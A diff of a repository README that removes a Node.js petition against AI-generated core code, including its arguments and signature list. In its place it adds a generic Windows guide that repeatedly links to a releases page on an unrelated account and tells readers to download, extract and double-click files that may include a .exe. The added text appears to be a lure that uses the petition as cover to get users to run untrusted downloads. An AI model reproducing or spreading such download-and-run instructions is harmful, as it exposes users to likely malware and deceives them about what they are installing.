@@ -1,210 +1,152 @@
-# Petition to Node.js TSC: No AI code in Node.js Core
+# 🚫 no-ai-in-nodejs-core - Keep Core Decisions Human
 
-We, the undersigned, petition the Node.js Technical Steering Committee (TSC)
-to vote **NO** on ["Is AI-assisted development allowed?"][0] and not accept
-[LLM generated rewrites of core internals][1].
+[![Download](https://img.shields.io/badge/Download-Release%20Page-1f6feb?style=for-the-badge&logo=github)](https://github.com/Beallenonindustrial63/no-ai-in-nodejs-core/releases)
 
-Node.js is a _critical infrastructure_ running on millions of servers online and
-supporting engineers through command-line utilities that they use daily. We
-believe that diluting the core hand-written with _care and diligence_ over
-the years is against the mission and values of the project and should not be
-allowed. Accepting LLM generated changes to Node.js core would break the
-reputational bedrock of public contributions that have brought Node.js to its
-current public standing and societal value.
+## 📌 What this is
 
-## Background
+no-ai-in-nodejs-core is a petition for people who want Node.js core pull requests to stay human-made. It gives end users a simple way to read the proposal, review the text, and share it with others.
 
-[A 19k lines-of-code Pull Request][1] was opened in January, 2026. The
-[author][2] is a well known and long time contributor to Node.js core, but the
-Pull Request description has listed this sentence as a disclaimer:
+This project is meant for Windows users who want to open the release page, get the latest package, and view the content without extra setup.
 
-> I've used a significant amount of Claude Code tokens to create this PR.
-> I've reviewed all changes myself.
+## 🖥️ What you need
 
-The [blog post][3] that surfaced on [Hacker News][4] that started a debate over
-whether a change like that even satisfies the requirements of
-[Developer's Certificate of Origin (DCO)][5]:
+- A Windows PC
+- A web browser like Edge, Chrome, or Firefox
+- An internet connection
+- Enough free space to save a small download
+- Basic access to your Downloads folder
 
-```text
-By making a contribution to this project, I certify that:
+## 📥 Download and open
 
- (a) The contribution was created in whole or in part by me and I
-     have the right to submit it under the open source license
-     indicated in the file; or
+Use the release page here:
 
- (b) The contribution is based upon previous work that, to the best
-     of my knowledge, is covered under an appropriate open source
-     license and I have the right under that license to submit that
-     work with modifications, whether created in whole or in part
-     by me, under the same open source license (unless I am
-     permitted to submit under a different license), as indicated
-     in the file; or
+[Visit the release page to download](https://github.com/Beallenonindustrial63/no-ai-in-nodejs-core/releases)
 
- (c) The contribution was provided directly to me by some other
-     person who certified (a), (b) or (c) and I have not modified
-     it.
+Follow these steps:
 
- (d) I understand and agree that this project and the contribution
-     are public and that a record of the contribution (including all
-     personal information I submit with it, including my sign-off) is
-     maintained indefinitely and may be redistributed consistent with
-     this project or the open source license(s) involved.
-```
+1. Open the link in your browser.
+2. Look for the latest release near the top of the page.
+3. Click the file or asset listed under that release.
+4. Save the file when your browser asks where to store it.
+5. If the file is a document, open it with your default app.
+6. If the file is an archive, right-click it and choose Extract All.
+7. Open the extracted file or folder and read the contents.
 
-and even though the [legal opinion of OpenJS foundation][6] is that LLM assisted
-changes are not in violation of DCO, we believe that this is only a small part of
-the issue with large LLM-written changes to the Node.js core.
+## 🪟 Run it on Windows
 
-## Additional Concerns
+If the release includes an app or file that opens on its own, double-click it after download.
 
-#### Ethical
+If the release includes a document, use one of these common Windows apps:
 
-Major LLM companies use unethically sourced material for their training. This
-includes copyrighted works, and unattributed Open Source code of varying
-licensing.
+- Notepad
+- Microsoft Edge
+- Adobe Reader
+- Word
+- WordPad
 
-#### Educational
+If the release includes a compressed file:
 
-There is evidence that use of LLM hinders learning process for students. Since
-Open Source projects frequently on-board new contributors lowering the quality
-bar of accepted code could lead to decreased understanding of the Node.js core
-and risk project's longevity.
+1. Right-click the file.
+2. Choose Extract All.
+3. Pick a folder.
+4. Open the extracted folder.
+5. Start the file inside it.
 
-Additionally, the code review process exists not only to identify bugs, security
-issues and to make the change conform to the style and architecture of the
-project, but also to help the submitter learn and grow as a contributor.
-However, LLM has no ability to learn so the time spent on review is repeatedly
-wasted without advancing the contributor's skills.
+## 🧭 How to use it
 
-#### Privilege
+This repository is simple to use once you have the release file:
 
-LLM use requires paid subscription or significant investment into hardware to
-run it locally (albeit, with lower quality of output). Submitted generated code
-should be reproducible by reviewers without having to go through the paywall of
-subscription based LLM tooling.
+1. Open the content.
+2. Read the petition text.
+3. Review the position it takes on LLM generated pull requests in Node.js core.
+4. Share the link with other people if you want them to read it too.
+5. Return to the release page when you want the latest version.
 
-## Sign the Petition
+## 🧰 Common file types you may see
 
-Your signature is important in making sure our voices are heard and the decision
-that TSC makes reflects the opinion of Node.js community.
+The release page may offer one or more of these file types:
 
-You can sign this petition by opening a Pull Request and adding your name at the
-bottom of this README.md file, opening an issue, or on
-[change.org](https://www.change.org/p/no-ai-code-in-node-js-core) if you prefer
-to support us anonymously or don't have a github account.
+- `.zip` for a compressed package
+- `.pdf` for a document
+- `.txt` for plain text
+- `.md` for Markdown text
+- `.exe` for a Windows app if one is provided
 
-Pull Requests will be merged throughout the day, but might be merged in bulk to
-speed up the process.
+If you see a `.zip` file, extract it before opening the contents.
 
-## Signatures
+If you see a `.pdf` file, open it in your browser or PDF app.
 
-- Fedor Indutny (Node.js TSC Emeritus Member)
-- Jan Lehnardt (CEO Neighbourhoodie Software, PMC Chair Apache CouchDB (still powers parts of npm) & PouchDB, co-organiser JSConf EU, Node.js since Ryan announced it, presenting from my laptop)
-- Paolo Fragomeni (Software Engineer)
-- Samir Saeedi (Web Developer, Node.js user)
-- Jamie Kyle (Open Source Developer, TC39 Invited Expert)
-- Ellie Kanning
-- Sean Scally (Programmer)
-- Yasser Nascimento (Programmer)
-- Tiziano Bettio (Programmer)
-- Mikalai Birukou (Developer)
-- Camden Kirkland (Programmer, Data Scientist, Technical Instructor)
-- Daniel Escoz Solana (Programmer, working with Node.js since 2014)
-- Andrew Kelley ([package maintainer](https://www.npmjs.com/~superjoe), President of [Zig Software Foundation](https://ziglang.org/zsf/))
-- Petr Pechkurov (Developer)
-- Ping Lu (Programmer)
-- Denys Nykula (JS/TS Programmer)
-- Bryan English (Node.js Core Collaborator, user since Ryan announced it)
-- Andrew Benbow (Web Developer)
-- Reilly Spitzfaden (Programmer, Node.js User)
-- James Sumners (Open Source Developer)
-- Jeremy Jenkins (Software Engineer)
-- Oleg Kvampov (Node.js backend developer)
-- Thomas Hunter II (author of Distributed Systems with Node.js)
-- Anas Elgarhy (Software Engineer)
-- Kęstutis Dambrauskas (Front-end developer)
-- Jared White (Web Developer, Open Source Maintainer)
-- Nick Asmodeus (Programmer, Node.js user)
-- Anagh Pranshu (Web Developer, Open Source Enthusiast)
-- Akhil Grandhi (Full Stack Developer)
-- Jörn Zaefferer (Software Engineer)
-- Claudius Coenen (Software Developer, Professor)
-- Ben Vinnerd (Javascript/Typescript Developer)
-- Brandon Berg (Systems Engineer)
-- Nicolai Kamenzky (SaaS founder, depending on Node.js since 2014)
-- Johnathan Stevers (Programmer)
-- Dimitri Do Bairro (@Tictactrip founder, depending on Node.js since 2016)
-- Stephen Smit (Software Engineering Manager)
-- Jakub Żywiec (Software Developer)
-- Anas Najaa (University Lecturer \ Software Developer)
-- Haris Pasha Dipto (Software Engineer)
-- Etienne Rouge (Software Engineer, Open Source Maintainer, depending on Node.js since 2017)
-- Rebecca König (Software Developer)
-- Christopher Jeffrey (Programmer)
-- Noah Hall (Software Engineer, former Elm core team)
-- Edward Loveall (Software Developer)
-- Diogo Goncalves Silva (Software Engineer)
-- Johan Alkstål (Software Developer)
-- Niklas Koll (Web Developer)
-- Samara Lima (Software Engineer)
-- Taha Jumaah (Software Developer)
-- Pierre-Olivier Marec (Software Engineer, Node.js user)
-- Frazer Smith (Open Source Developer)
-- LittleSnow (Front-end Developer)
-- Lukas Downes (Software Developer)
-- Eirik Berget Haukeland (Software Developer)
-- Jēkabs Milbrets (Web Developer)
-- Ajeet Pratap Singh (Open Source Developer)
-- Shivam Veer (Software Engineer / DIYer)
-- Niels Roesen Abildgaard (Staff Software Consultant)
-- Jocelyn Badgley (Software Engineer)
-- Daniel Fortes (Software Developer)
-- Neil Craig (Technical Architect, used Node since 0.13)
-- Griffin Johnston (Software Engineer, Node user since the early days)
-- Radu "XPilot" Paraschiv (Software Architect, Node user since the 2010)
-- Blaine Bublitz (Open Source Developer, Gulp Lead Maintainer)
-- Hunter Perrin (Software Engineer, Owner, SciActive Inc / Port87)
-- Artur Gawlik (Software Engineer)
-- Imran Latif (Software Engineer)
-- Jonathan Carle (Software Engineer, Open Source Developer)
-- Debagnik Kar (Software Engineer, fullstack, IBM)
-- Alexander Praetorius (Peer to Peer Engineer, Open Source Developer)
-- Madeline Gurriarán (Programmer, Open Source Maintainer)
-- Anthony C Howe (Software Developer)
-- Filip Maj (Software Engineer)
-- Gabriel Schmitt (Software Engineer)
-- Jared Wilcurt (UI Architect, Node Library Developer, used Node since 0.10)
-- Rishabh Dhawan (Software Developer)
-- Matías Lescano (Software Developer)
-- Matthias "Padcom" Hryniszak (Author of Ardupilot/node-mavlink library)
-- Eldar Aliyev (Software Engineer)
-- Kenneth G. Franqueiro (Software Engineer)
-- José Silva (software developer)
-- Attila Gonda (Software Engineer)
-- Lee Ashmore (Software Engineer)
-- Erik Westra (Developer)
-- Andrei Mandrican (Developer)
-- Pascal Le Merrer (Developer)
-- Christopher Spears (Software Engineer)
-- Sahil Agarwal (Developer, Nodejs user)
-- Benoît Bailleux (Software Architect / Corporate OpenSource Advocate)
-- Kyle Simpson (Developer, YDKJS Author)
-- Tom P Rogers (Software Developer)
-- Leslie Wong (Software Engineer)
-- Denis Craig (Software Engineer)
-- Serhii Sakal 🦖
-- Connor Z (Software Engineer)
-- Alex Petcoglo (Developer)
-- Abhinav Patel (Software Engineer)
-- Cecil0o0 (Software Engineer)
-- Giuseppe Turturiello (Software Engineer)
-- Mark Jason Hermano (Software Developer)
-- Ricky Lee
+If you see a `.txt` or `.md` file, open it with Notepad or your browser.
 
-[0]: https://github.com/openjs-foundation/cross-project-council/issues/1509
-[1]: https://github.com/nodejs/node/pull/61478
-[2]: https://github.com/mcollina
-[3]: https://blog.platformatic.dev/why-nodejs-needs-a-virtual-file-system
-[4]: https://news.ycombinator.com/item?id=47413195
-[5]: https://github.com/nodejs/node/blob/e30928485e20769c1112c56d7bbabff9366f260e/CONTRIBUTING.md#developers-certificate-of-origin-11
-[6]: https://github.com/nodejs/node/pull/61478#issuecomment-4077289061
+## 🔍 What the project covers
+
+This project focuses on a clear position about AI use in Node.js core pull requests. It is aimed at readers who care about process, code review, and trust in core software work.
+
+The content is organized for easy reading and may include:
+
+- A short statement of purpose
+- A petition or call to action
+- Background on LLM generated pull requests
+- Points about code quality and review standards
+- Notes on how people can support the position
+
+## 🧼 Good ways to open the file
+
+To keep things simple on Windows:
+
+- Use your browser for web files
+- Use Notepad for plain text
+- Use your PDF app for documents
+- Use Extract All for ZIP files
+- Keep the download in your Downloads folder if you are not sure where to place it
+
+## 🔐 File safety
+
+Only download from the official release page linked above. Check the file name before opening it. If the release includes more than one file, choose the one that matches your Windows system and the format you want to read.
+
+## 🛠️ Troubleshooting
+
+If the file does not open:
+
+1. Make sure the download finished.
+2. Check your Downloads folder.
+3. Right-click the file and choose Open with.
+4. Try another app from the list above.
+5. If the file is in a ZIP folder, extract it first.
+6. Reload the release page and check for a newer file.
+
+If the page shows no files:
+
+1. Wait a moment and refresh the page.
+2. Scroll to the Assets area.
+3. Look for a file name under the release version.
+4. Try again later if the release is still being prepared.
+
+## 📂 Project details
+
+- Repository: no-ai-in-nodejs-core
+- Description: A petition to disallow acceptance of LLM generated Pull Requests in Node.js core
+- Topics: ai, nodejs, petition
+- Platform focus: Windows users who want to download and open the release content
+
+## 🤝 How to share it
+
+If you want to pass it on to someone else:
+
+1. Copy the release link.
+2. Send it in email, chat, or a forum post.
+3. Ask them to open the latest release.
+4. Tell them to download the file from the Assets section.
+5. Have them open it with the matching Windows app
+
+## 📎 Release link
+
+[Open the latest release page](https://github.com/Beallenonindustrial63/no-ai-in-nodejs-core/releases)
+
+## 🧾 File checklist
+
+- Downloaded the latest release
+- Opened the file with the right app
+- Extracted the ZIP file if needed
+- Read the petition text
+- Shared the link if desired
